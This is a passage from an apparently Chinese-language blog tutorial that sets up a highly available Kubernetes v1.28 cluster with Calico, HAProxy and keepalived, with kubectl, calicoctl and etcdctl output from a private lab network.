class="line">calico-system      csi-node-driver-chs4d                      2/2     Running   0             14m</span><br><span class="line">calico-system      csi-node-driver-j4tfr                      2/2     Running   0             30m</span><br><span class="line">kube-system        coredns-66f779496c-5k796                   1/1     Running   0             78m</span><br><span class="line">kube-system        coredns-66f779496c-mxc5j                   1/1     Running   0             78m</span><br><span class="line">kube-system        etcd-k8s-master1                           1/1     Running   1 (32m ago)   78m</span><br><span class="line">kube-system        kube-apiserver-k8s-master1                 1/1     Running   1 (32m ago)   78m</span><br><span class="line">kube-system        kube-controller-manager-k8s-master1        1/1     Running   1 (32m ago)   78m</span><br><span class="line">kube-system        kube-proxy-gczxm                           1/1     Running   1 (32m ago)   78m</span><br><span class="line">kube-system        kube-proxy-wfhh7                           1/1     Running   0             14m</span><br><span class="line">kube-system        kube-scheduler-k8s-master1                 1/1     Running   1 (32m ago)   78m</span><br><span class="line">tigera-operator    tigera-operator-c7ccbd65-rzt2l             1/1     Running   1 (32m ago)   56m</span><br></pre></td></tr></table></figure>

<p>可以查到主, 从节点已经Ready</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># kubectl get nodes</span><br><span class="line">NAME         STATUS   ROLES           AGE     VERSION</span><br><span class="line">k8s-master   Ready    control-plane   5h33m   v1.28.2</span><br><span class="line">k8s-node1    Ready    &lt;none&gt;          11m     v1.28.2</span><br><span class="line">k8s-node2    Ready    &lt;none&gt;          11m     v1.28.2</span><br><span class="line"></span><br><span class="line"># calicoctl node status</span><br><span class="line">Calico process is running.</span><br><span class="line"></span><br><span class="line">IPv4 BGP status</span><br><span class="line">+----------------+-------------------+-------+----------+-------------+</span><br><span class="line">|  PEER ADDRESS  |     PEER TYPE     | STATE |  SINCE   |    INFO     |</span><br><span class="line">+----------------+-------------------+-------+----------+-------------+</span><br><span class="line">| 192.168.52.101 | node-to-node mesh | up    | 14:38:07 | Established |</span><br><span class="line">+----------------+-------------------+-------+----------+-------------+</span><br><span class="line"></span><br><span class="line">IPv6 BGP status</span><br><span class="line">No IPv6 peers found.</span><br><span class="line"></span><br><span class="line"># calicoctl get nodes</span><br><span class="line">NAME</span><br><span class="line">k8s-master1</span><br><span class="line">k8s-slave1</span><br></pre></td></tr></table></figure>

<h2><span id="4-简单测试一主一从集群在集群上部署nginx">4. 简单测试一主一从集群，在集群上部署Nginx</span></h2><p>创建Nginx deployment(nginx-deployment.yaml), 设置副本数为2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: apps/v1</span><br><span class="line">kind: Deployment</span><br><span class="line">metadata:</span><br><span class="line">  name: nginx-deployment</span><br><span class="line">spec:</span><br><span class="line">  selector:</span><br><span class="line">    matchLabels:</span><br><span class="line">      app: nginx</span><br><span class="line">  replicas: 3 # 副本数设置为3，假设集群中有三个节点，每个节点上会尝试运行一个Nginx实例（但k8s会根据资源情况和调度策略来实际分配）</span><br><span class="line">  template:</span><br><span class="line">    metadata:</span><br><span class="line">      labels:</span><br><span class="line">        app: nginx</span><br><span class="line">    spec:</span><br><span class="line">      containers:</span><br><span class="line">      - name: nginx</span><br><span class="line">        image: swr.cn-north-4.myhuaweicloud.com/ddn-k8s/docker.io/nginx:1.19-alpine</span><br><span class="line">        ports:</span><br><span class="line">        - containerPort: 80</span><br></pre></td></tr></table></figure>

<p>创建Service(nginx-service.yaml), NodePort暴露服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apiVersion: v1</span><br><span class="line">kind: Service</span><br><span class="line">metadata:</span><br><span class="line">  name: nginx-service</span><br><span class="line">spec:</span><br><span class="line">  type: NodePort</span><br><span class="line">  selector:</span><br><span class="line">    app: nginx</span><br><span class="line">  ports:</span><br><span class="line">    - protocol: TCP</span><br><span class="line">      port: 80</span><br><span class="line">      targetPort: 80</span><br><span class="line">      nodePort: 30080  # 可以指定具体的NodePort，确保端口不冲突且在范围内(30000-32767)</span><br></pre></td></tr></table></figure>

<p>应用deployment, Service</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl apply -f nginx-deployment.yaml</span><br><span class="line">kubectl apply -f nginx-service.yaml</span><br></pre></td></tr></table></figure>

<p>查看Pod, Nginx pod只调度到了工作节点上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># kubectl get pods -o wide</span><br><span class="line">NAME                                READY   STATUS    RESTARTS   AGE   IP            NODE         NOMINATED NODE   READINESS GATES</span><br><span class="line">nginx-deployment-645d5cfc8b-h8qnr   1/1     Running   0          14s   198.18.0.72   k8s-slave1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">nginx-deployment-645d5cfc8b-hdn8k   1/1     Running   0          14s   198.18.0.71   k8s-slave1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">nginx-deployment-645d5cfc8b-lkjms   1/1     Running   0          14s   198.18.0.73   k8s-slave1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line"></span><br><span class="line">kubectl get svc  | grep nginx</span><br><span class="line">nginx-service   NodePort    10.105.69.177   &lt;none&gt;        80:30080/TCP   49s</span><br></pre></td></tr></table></figure>

<p>通过任意节点请求Nginx, 返回200 OK</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># curl k8s-master1:30080 -i</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line"># curl k8s-slave1:30080 -i</span><br><span class="line">HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure>

<p>删除deployment和service</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@k8s-master ~]# kubectl delete deploy nginx-deployment</span><br><span class="line">deployment.apps &quot;nginx-deployment&quot; deleted</span><br><span class="line"># kubectl delete service nginx-service</span><br><span class="line">service &quot;nginx-service&quot; deleted</span><br></pre></td></tr></table></figure>

<h1><span id="二-配置负载均衡">二、 配置负载均衡</span></h1><p>准备两个节点用于负载均衡, 以及一个Virtual IP, 某个节点发生故障时, Virtual IP可以漂移到另一个节点, 从而实现高可用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.52.80 HAProxy</span><br><span class="line">192.168.52.81 HAProxy</span><br><span class="line">192.168.52.88 www.petertest.com Virtual IP</span><br></pre></td></tr></table></figure>

<p>关闭SELinux和firewalld</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld</span><br><span class="line">setenforce 0</span><br><span class="line">sed --follow-symlinks -i &quot;s/SELINUX=enforcing/SELINUX=disabled/g&quot; /etc/selinux/config</span><br></pre></td></tr></table></figure>

<h2><span id="安装keepalived和haproxy">安装keepalived和HAproxy</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install keepalived haproxy psmisc -y</span><br></pre></td></tr></table></figure>

<h2><span id="配置haproxy">配置HAproxy</span></h2><p>vi &#x2F;etc&#x2F;haproxy&#x2F;haproxy.cfg</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">global</span><br><span class="line">    log /dev/log local0 warning</span><br><span class="line">    chroot /var/lib/haproxy</span><br><span class="line">    pidfile /var/run/haproxy.pid</span><br><span class="line">    maxconn 4000</span><br><span class="line">    user haproxy</span><br><span class="line">    group haproxy</span><br><span class="line">    daemon</span><br><span class="line">    stats socket /var/lib/haproxy/stats</span><br><span class="line"></span><br><span class="line">defaults</span><br><span class="line">    log global</span><br><span class="line">    option httplog</span><br><span class="line">    option dontlognull</span><br><span class="line">    timeout connect 5000</span><br><span class="line">    timeout client 50000</span><br><span class="line">    timeout server 50000</span><br><span class="line"></span><br><span class="line">frontend kube-apiserver</span><br><span class="line">    bind *:6443</span><br><span class="line">    mode tcp</span><br><span class="line">    option tcplog</span><br><span class="line">    default_backend kube-apiserver</span><br><span class="line"></span><br><span class="line">backend kube-apiserver</span><br><span class="line">    mode tcp</span><br><span class="line">    option tcplog</span><br><span class="line">    option tcp-check</span><br><span class="line">    balance roundrobin</span><br><span class="line">    default-server inter 10s downinter 5s rise 2 fall 2 slowstart 60s maxconn 250 maxqueue 256 weight 100</span><br><span class="line">    server kube-apiserver-1 192.168.52.91:6443 check # Replace the IP address with your own.</span><br></pre></td></tr></table></figure>

<p>重启HAProxy, 设置开机自动运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart haproxy</span><br><span class="line">systemctl enable haproxy</span><br></pre></td></tr></table></figure>

<p>测试一下HAProxy</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl localhost:6443</span><br><span class="line">curl: (52) Empty reply from server</span><br><span class="line">tcpdump dst port 6443</span><br><span class="line">22:51:02.055968 IP 192.168.52.80.41304 &gt; k8s-master1.sun-sr-https: Flags [S], seq 1465862176, win 32120, options [mss 1460,sackOK,TS val 2222524931 ecr 0,nop,wscale 7], length 0</span><br></pre></td></tr></table></figure>

<h2><span id="配置keepalived">配置keepalived</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.52.80 k8s-lb1 HAProxy</span><br><span class="line">192.168.52.81 k8s-lb2 HAProxy</span><br><span class="line">192.168.52.88 www.petertest.com Virtual IP </span><br></pre></td></tr></table></figure>

<p>k8s-lb1配置<br>vi &#x2F;etc&#x2F;keepalived&#x2F;keepalived.conf</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">global_defs &#123;</span><br><span class="line">    router_id LVS_DEVEL # 每个keepalived实例应该有一个唯一的router_id</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vrrp_script chk_haproxy &#123;</span><br><span class="line">    script &quot;killall -0 haproxy&quot; # 使用killall命令检查haproxy是否存活</span><br><span class="line">    interval 2 # 检查间隔为2秒</span><br><span class="line">    weight 2 # 如果脚本失败，优先级减少2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vrrp_instance haproxy-vip &#123;</span><br><span class="line">    state MASTER # 对于主服务器应设置为MASTER，对于备用服务器设置为BACKUP</span><br><span class="line">    priority 100 # 主服务器的优先级应高于备用服务器</span><br><span class="line">    interface ens160 # 绑定的网络接口名称，请根据实际情况调整</span><br><span class="line">    virtual_router_id 60 # 虚拟路由ID，必须在主备服务器上保持一致</span><br><span class="line">    advert_int 1 # 广告间隔时间</span><br><span class="line">    authentication &#123; # 认证信息，用于主备服务器间通信</span><br><span class="line">        auth_type PASS</span><br><span class="line">        auth_pass 1111 # 这里的密码需要在主备服务器上保持一致</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    unicast_src_ip 192.168.52.80 # 本机IP地址</span><br><span class="line"></span><br><span class="line">    unicast_peer &#123; # 单播对等体列表，列出所有参与VRRP组的其他节点</span><br><span class="line">        192.168.52.81 # 备用服务器的IP地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    virtual_ipaddress &#123;</span><br><span class="line">        192.168.52.88/24 # 虚拟IP地址及其子网掩码</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    track_script &#123;</span><br><span class="line">        chk_haproxy # 引用之前定义的健康检查脚本</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重启keepalived, 设置自启动</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart keepalived</span><br><span class="line">systemctl enable keepalived</span><br></pre></td></tr></table></figure>

<p>k8s-lb2也配置keepalived, 如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">global_defs &#123;</span><br><span class="line">    router_id LVS_DEVEL_BACKUP # 这个ID需要和主服务器的router_id区分开来</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vrrp_script chk_haproxy &#123;</span><br><span class="line">    script &quot;killall -0 haproxy&quot; # 检查haproxy是否存活</span><br><span class="line">    interval 2 # 每2秒执行一次检查</span><br><span class="line">    weight 2 # 如果脚本失败，优先级减少2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vrrp_instance haproxy-vip &#123;</span><br><span class="line">    state BACKUP # 设置为BACKUP状态</span><br><span class="line">    priority 99 # 优先级要比主服务器低，例如设置为99</span><br><span class="line">    interface ens160 # 绑定的网络接口，根据实际情况修改</span><br><span class="line">    virtual_router_id 60 # 虚拟路由ID，必须与主服务器保持一致</span><br><span class="line">    advert_int 1 # 广告间隔时间</span><br><span class="line">    authentication &#123;</span><br><span class="line">        auth_type PASS</span><br><span class="line">        auth_pass 1111 # 认证密码需与主服务器相同</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    unicast_src_ip 192.168.52.81 # 当前服务器的IP地址</span><br><span class="line">    unicast_peer &#123;</span><br><span class="line">        192.168.52.80 # 主服务器的IP地址</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    virtual_ipaddress &#123;</span><br><span class="line">        192.168.52.88/24 # 虚拟IP地址及其子网掩码，需与主服务器保持一致</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    track_script &#123;</span><br><span class="line">        chk_haproxy # 引用健康检查脚本</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="验证高可用">验证高可用</span></h2><p>curl测试VIP, 同时可以在某个LB实例上通过ip addr查到VIP</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl 192.168.52.88:6443</span><br><span class="line">curl: (52) Empty reply from server</span><br><span class="line"></span><br><span class="line">ip addr</span><br><span class="line"># ip addr</span><br><span class="line">2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:4f:99:01 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    altname enp3s0</span><br><span class="line">    inet 192.168.52.80/24 brd 192.168.52.255 scope global noprefixroute ens160</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet 192.168.52.88/24 scope global secondary ens160</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>

<p>测试高可用, 任意关机一台LB, VIP仍能访问, 且成功漂移到另一台LB</p>
<h1><span id="三-搭建高可用集群三主三从两lb">三、搭建高可用集群(三主三从两LB)</span></h1><h2><span id="重置之前的k8s节点">重置之前的k8s节点</span></h2><p>在主节点执行如下命令, 把从节点移出集群</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl delete node k8s-slave1</span><br></pre></td></tr></table></figure>
<p>在从节点执行, 重置从节点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl stop kubelet</span><br><span class="line">kubeadm reset</span><br><span class="line">rm -rf /etc/kubernetes/*</span><br></pre></td></tr></table></figure>
<p>重置主节点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubeadm reset</span><br><span class="line">rm -rf $HOME/.kube</span><br></pre></td></tr></table></figure>

<h2><span id="用vip重新初始化主节点">用VIP重新初始化主节点</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubeadm init --control-plane-endpoint=&quot;www.petertest.com:6443&quot; --upload-certs \</span><br><span class="line">			 --image-repository registry.aliyuncs.com/google_containers \</span><br><span class="line">			 --kubernetes-version v1.28.2 \</span><br><span class="line">			 --pod-network-cidr=198.18.0.0/16</span><br></pre></td></tr></table></figure>
<p>执行后，输出提示, 它告诉你如何加入其他主节点和工作节点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Your Kubernetes control-plane has initialized successfully!</span><br><span class="line"></span><br><span class="line">To start using your cluster, you need to run the following as a regular user:</span><br><span class="line"></span><br><span class="line">  mkdir -p $HOME/.kube</span><br><span class="line">  sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br><span class="line">  sudo chown $(id -u):$(id -g) $HOME/.kube/config</span><br><span class="line"></span><br><span class="line">Alternatively, if you are the root user, you can run:</span><br><span class="line"></span><br><span class="line">  export KUBECONFIG=/etc/kubernetes/admin.conf</span><br><span class="line"></span><br><span class="line">You should now deploy a pod network to the cluster.</span><br><span class="line">Run &quot;kubectl apply -f [podnetwork].yaml&quot; with one of the options listed at:</span><br><span class="line">  https://kubernetes.io/docs/concepts/cluster-administration/addons/</span><br><span class="line"></span><br><span class="line">You can now join any number of the control-plane node running the following command on each as root:</span><br><span class="line"></span><br><span class="line">  kubeadm join www.petertest.com:6443 --token oa0iql.m7pbqe76ox30cmj2 \</span><br><span class="line">        --discovery-token-ca-cert-hash sha256:f68a231370853f52c1894f34b86e32069f2748be8f54d67f661d59d6e11a8fc8 \</span><br><span class="line">        --control-plane --certificate-key 548e38fad35f8f97ff066decd6a779a037e30cf0490e2facd78cd6dbb14a7371</span><br><span class="line"></span><br><span class="line">Please note that the certificate-key gives access to cluster sensitive data, keep it secret!</span><br><span class="line">As a safeguard, uploaded-certs will be deleted in two hours; If necessary, you can use</span><br><span class="line">&quot;kubeadm init phase upload-certs --upload-certs&quot; to reload certs afterward.</span><br><span class="line"></span><br><span class="line">Then you can join any number of worker nodes by running the following on each as root:</span><br><span class="line"></span><br><span class="line">kubeadm join www.petertest.com:6443 --token oa0iql.m7pbqe76ox30cmj2 \</span><br><span class="line">        --discovery-token-ca-cert-hash sha256:f68a231370853f52c1894f34b86e32069f2748be8f54d67f661d59d6e11a8fc8</span><br></pre></td></tr></table></figure>

<p>测试VIP, 返回200 OK</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl https://www.petertest.com:6443/healthz -k</span><br><span class="line">ok</span><br></pre></td></tr></table></figure>
<p>注: 国内用户需手动下载calico镜像</p>
<h2><span id="加入其余两个主节点">加入其余两个主节点</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubeadm join www.petertest.com:6443 --token oa0iql.m7pbqe76ox30cmj2 \</span><br><span class="line">        --discovery-token-ca-cert-hash sha256:f68a231370853f52c1894f34b86e32069f2748be8f54d67f661d59d6e11a8fc8 \</span><br><span class="line">        --control-plane --certificate-key 548e38fad35f8f97ff066decd6a779a037e30cf0490e2facd78cd6dbb14a7371</span><br><span class="line"></span><br><span class="line">mkdir -p $HOME/.kube</span><br><span class="line">sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span><br><span class="line">sudo chown $(id -u):$(id -g) $HOME/.kube/config</span><br><span class="line"></span><br><span class="line">systemctl enable kubelet.service</span><br></pre></td></tr></table></figure>
<p>注: 国内用户需手动下载并导入calico镜像</p>
<h2><span id="加入其余两个从节点">加入其余两个从节点</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubeadm join www.petertest.com:6443 --token oa0iql.m7pbqe76ox30cmj2 \</span><br><span class="line">        --discovery-token-ca-cert-hash sha256:f68a231370853f52c1894f34b86e32069f2748be8f54d67f661d59d6e11a8fc8</span><br><span class="line"></span><br><span class="line">systemctl enable kubelet.service</span><br></pre></td></tr></table></figure>
<p>注: 国内用户需手动下载并导入calico镜像</p>
<h2><span id="测试集群">测试集群</span></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kubectl get nodes</span><br><span class="line">[root@k8s-master1 ~]# kubectl get nodes</span><br><span class="line">NAME          STATUS   ROLES           AGE     VERSION</span><br><span class="line">k8s-master1   Ready    control-plane   72m     v1.28.2</span><br><span class="line">k8s-master2   Ready    control-plane   44m     v1.28.2</span><br><span class="line">k8s-master3   Ready    control-plane   22m     v1.28.2</span><br><span class="line">k8s-slave1    Ready    &lt;none&gt;          11m     v1.28.2</span><br><span class="line">k8s-slave2    Ready    &lt;none&gt;          5m46s   v1.28.2</span><br><span class="line">k8s-slave3    Ready    &lt;none&gt;          5m44s   v1.28.2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#  kubectl get pods -A -o wide</span><br><span class="line">NAMESPACE          NAME                                       READY   STATUS    RESTARTS      AGE     IP               NODE          NOMINATED NODE   READINESS GATES</span><br><span class="line">calico-apiserver   calico-apiserver-74966f94d7-cjjjp          1/1     Running   2 (30m ago)   68m     198.18.159.142   k8s-master1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">calico-apiserver   calico-apiserver-74966f94d7-xxvvh          1/1     Running   2 (30m ago)   68m     198.18.159.143   k8s-master1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">calico-system      calico-kube-controllers-6c7d459d66-9t72c   1/1     Running   2 (30m ago)   68m     198.18.159.146   k8s-master1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">calico-system      calico-node-59ffd                          1/1     Running   0             42m     192.168.52.92    k8s-master2   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">calico-system      calico-node-bphnr                          1/1     Running   1             15m     192.168.52.101   k8s-slave1    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">calico-system      calico-node-jk4q8                          1/1     Running   2 (30m ago)   68m     192.168.52.91    k8s-master1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">calico-system      calico-node-pnjhc                          1/1     Running   0             21m     192.168.52.93    k8s-master3   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">calico-system      calico-node-x4llg                          1/1     Running   0             4m18s   192.168.52.103   k8s-slave3    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">calico-system      calico-node-x7jfv                          1/1     Running   0             4m20s   192.168.52.102   k8s-slave2    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">calico-system      calico-typha-77686bcb79-nxpgq              1/1     Running   0             4m17s   192.168.52.103   k8s-slave3    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">calico-system      calico-typha-77686bcb79-ql94f              1/1     Running   0             21m     192.168.52.93    k8s-master3   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">calico-system      calico-typha-77686bcb79-xtqlg              1/1     Running   2 (30m ago)   68m     192.168.52.91    k8s-master1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">calico-system      csi-node-driver-25nhw                      2/2     Running   4 (30m ago)   68m     198.18.159.147   k8s-master1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">calico-system      csi-node-driver-28xwt                      2/2     Running   2             15m     198.18.0.64      k8s-slave1    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">calico-system      csi-node-driver-4hr97                      2/2     Running   0             4m18s   198.18.158.193   k8s-slave3    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">calico-system      csi-node-driver-dwcd8                      2/2     Running   0             21m     198.18.135.193   k8s-master3   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">calico-system      csi-node-driver-fspfc                      2/2     Running   0             42m     198.18.224.1     k8s-master2   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">calico-system      csi-node-driver-kk92q                      2/2     Running   0             4m20s   198.18.92.1      k8s-slave2    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system        coredns-66f779496c-5lx42                   1/1     Running   2 (30m ago)   70m     198.18.159.145   k8s-master1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system        coredns-66f779496c-pvx2r                   1/1     Running   2 (30m ago)   70m     198.18.159.144   k8s-master1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system        etcd-k8s-master1                           1/1     Running   7 (30m ago)   70m     192.168.52.91    k8s-master1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system        etcd-k8s-master2                           1/1     Running   0             42m     192.168.52.92    k8s-master2   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system        etcd-k8s-master3                           1/1     Running   0             21m     192.168.52.93    k8s-master3   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system        kube-apiserver-k8s-master1                 1/1     Running   7 (30m ago)   70m     192.168.52.91    k8s-master1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system        kube-apiserver-k8s-master2                 1/1     Running   2 (29m ago)   42m     192.168.52.92    k8s-master2   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system        kube-apiserver-k8s-master3                 1/1     Running   0             21m     192.168.52.93    k8s-master3   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system        kube-controller-manager-k8s-master1        1/1     Running   8 (30m ago)   70m     192.168.52.91    k8s-master1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system        kube-controller-manager-k8s-master2        1/1     Running   2 (29m ago)   42m     192.168.52.92    k8s-master2   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system        kube-controller-manager-k8s-master3        1/1     Running   0             21m     192.168.52.93    k8s-master3   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system        kube-proxy-58pvn                           1/1     Running   0             42m     192.168.52.92    k8s-master2   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system        kube-proxy-7jwg6                           1/1     Running   0             4m20s   192.168.52.102   k8s-slave2    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system        kube-proxy-7x4wf                           1/1     Running   0             4m18s   192.168.52.103   k8s-slave3    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system        kube-proxy-8khss                           1/1     Running   0             21m     192.168.52.93    k8s-master3   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system        kube-proxy-ctjcc                           1/1     Running   2 (30m ago)   70m     192.168.52.91    k8s-master1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system        kube-proxy-m2g7p                           1/1     Running   1             15m     192.168.52.101   k8s-slave1    &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system        kube-scheduler-k8s-master1                 1/1     Running   7 (30m ago)   70m     192.168.52.91    k8s-master1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system        kube-scheduler-k8s-master2                 1/1     Running   0             42m     192.168.52.92    k8s-master2   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">kube-system        kube-scheduler-k8s-master3                 1/1     Running   0             21m     192.168.52.93    k8s-master3   &lt;none&gt;           &lt;none&gt;</span><br><span class="line">tigera-operator    tigera-operator-c7ccbd65-zgdv6             1/1     Running   3 (30m ago)   68m     192.168.52.91    k8s-master1   &lt;none&gt;           &lt;none&gt;</span><br><span class="line"></span><br><span class="line"># calicoctl node status</span><br><span class="line">Calico process is running.</span><br><span class="line"></span><br><span class="line">IPv4 BGP status</span><br><span class="line">+----------------+-------------------+-------+----------+-------------+</span><br><span class="line">|  PEER ADDRESS  |     PEER TYPE     | STATE |  SINCE   |    INFO     |</span><br><span class="line">+----------------+-------------------+-------+----------+-------------+</span><br><span class="line">| 192.168.52.92  | node-to-node mesh | up    | 16:10:22 | Established |</span><br><span class="line">| 192.168.52.93  | node-to-node mesh | up    | 16:19:50 | Established |</span><br><span class="line">| 192.168.52.101 | node-to-node mesh | up    | 16:30:01 | Established |</span><br><span class="line">| 192.168.52.103 | node-to-node mesh | up    | 16:38:33 | Established |</span><br><span class="line">| 192.168.52.102 | node-to-node mesh | up    | 16:38:35 | Established |</span><br><span class="line">+----------------+-------------------+-------+----------+-------------+</span><br><span class="line"></span><br><span class="line">IPv6 BGP status</span><br><span class="line">No IPv6 peers found.</span><br><span class="line"></span><br><span class="line">[root@k8s-master1 ~]# calicoctl get nodes</span><br><span class="line">NAME</span><br><span class="line">k8s-master1</span><br><span class="line">k8s-master2</span><br><span class="line">k8s-master3</span><br><span class="line">k8s-slave1</span><br><span class="line">k8s-slave2</span><br><span class="line">k8s-slave3</span><br></pre></td></tr></table></figure>

<h3><span id="安装etcdctl-检查etcd状态">安装etcdctl, 检查etcd状态</span></h3><p>我在安装集群的时候误将k8s-slave1作为主节点加入, 所以通过etcdctl将slave1节点移除. etcdctl安装和使用方法如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://github.com/etcd-io/etcd/releases/download/v3.5.9/etcd-v3.5.9-linux-amd64.tar.gz</span><br><span class="line">tar zxvf etcd-v3.5.9-linux-amd64.tar.gz</span><br><span class="line">cp etcd-v3.5.9-linux-amd64/etcdctl /usr/local/bin/</span><br><span class="line"></span><br><span class="line"># ETCDCTL_API=3 etcdctl \</span><br><span class="line">--cert /etc/kubernetes/pki/etcd/peer.crt \</span><br><span class="line">--key /etc/kubernetes/pki/etcd/peer.key \</span><br><span class="line">--cacert /etc/kubernetes/pki/etcd/ca.crt \</span><br><span class="line">--endpoints=https://192.168.52.91:2379,https://192.168.52.92:2379,https://192.168.52.93:2379 endpoint status --cluster -w table</span><br><span class="line">&#123;&quot;level&quot;:&quot;warn&quot;,&quot;ts&quot;:&quot;2025-03-19T22:20:14.844504+0800&quot;,&quot;logger&quot;:&quot;etcd-client&quot;,&quot;caller&quot;:&quot;v3@v3.5.9/retry_interceptor.go:62&quot;,&quot;msg&quot;:&quot;retrying of unary invoker failed&quot;,&quot;target&quot;:&quot;etcd-endpoints://0xc000338c40/192.168.52.91:2379&quot;,&quot;attempt&quot;:0,&quot;error&quot;:&quot;rpc error: code = DeadlineExceeded desc = latest balancer error: last connection error: connection error: desc = \&quot;transport: Error while dialing dial tcp 192.168.52.101:2379: connect: connection refused\&quot;&quot;&#125;</span><br><span class="line">Failed to get the status of endpoint https://192.168.52.101:2379 (context deadline exceeded)</span><br><span class="line">+----------------------------+------------------+---------+---------+-----------+------------+-----------+------------+--------------------+--------+</span><br><span class="line">|          ENDPOINT          |        ID        | VERSION | DB SIZE | IS LEADER | IS LEARNER | RAFT TERM | RAFT INDEX | RAFT APPLIED INDEX | ERRORS |</span><br><span class="line">+----------------------------+------------------+---------+---------+-----------+------------+-----------+------------+--------------------+--------+</span><br><span class="line">| https://192.168.52.91:2379 |  d7096f0da355cc9 |   3.5.9 |   12 MB |     false |      false |         9 |      31702 |              31702 |        |</span><br><span class="line">| https://192.168.52.92:2379 | 1f466381ed3a930e |   3.5.9 |  